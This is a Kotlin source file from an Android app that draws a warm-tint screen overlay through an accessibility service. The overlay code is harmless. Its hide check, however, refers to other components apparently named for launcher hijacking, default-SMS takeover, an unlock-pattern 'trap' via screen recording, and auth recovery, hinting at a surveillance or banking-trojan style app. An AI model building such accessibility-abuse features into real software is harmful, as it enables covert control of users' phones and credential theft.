package com.example.myandroid

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager

object UserOverlayManager {
    private var overlayView: View? = null
    private var isAttached = false

    fun refresh(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            val isEnabled = prefs.getBoolean("is_warmth_enabled", false)
            val intensity = prefs.getInt("warmth_intensity", 50)

            if (!isEnabled || shouldHide(ctx)) {
                hide(ctx)
                return@post
            }

            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (overlayView == null) {
                overlayView = View(service).apply {
                    systemUiVisibility = View.SYSTEM_UI_FLAG_LAYOUT_STABLE or 
                        View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or 
                        View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                }
            }
            
            // Color calc: Amber/Orange with alpha based on intensity
                            val maxAlpha = 0.6f
                val alpha = (intensity / 100f) * maxAlpha
                // Soft, warm candlelight color temperature (3400K) to prevent muddy/dirty gray-shifts
                val color = android.graphics.Color.argb((alpha * 255).toInt(), 255, 195, 115)
                overlayView?.setBackgroundColor(color)

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }

            if (!isAttached) {
                try {
                    wm.addView(overlayView, params)
                    isAttached = true
                    DebugLogger.log("WARMTH_UI", "User warmth overlay attached.")
                } catch (e: Exception) {}
            } else {
                try { wm.updateViewLayout(overlayView, params) } catch(e:Exception){}
            }
        }
    }

    fun hide(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (isAttached && overlayView != null) {
                try { 
                    wm.removeView(overlayView) 
                    isAttached = false
                    DebugLogger.log("WARMTH_UI", "User warmth overlay detached (Yielding to system).")
                } catch (e: Exception) {}
            }
        }
    }

    private fun shouldHide(ctx: Context): Boolean {
        if (DimmerManager.currentLevel < 100) return true
        val svc = MyAccessibilityService.instance
        if (svc?.activeSequence != null) return true
        if (DynamicUIManager.isAnyAttached) return true
        if (LauncherManager.isHijacking) return true
        if (DefaultSmsManager.expectedMode.isNotEmpty()) return true
        if (ScreenRecordManager.isPatternTrap) return true
        if (AuthRecoveryManager.isRecoveryActive) return true
        return false
    }
}
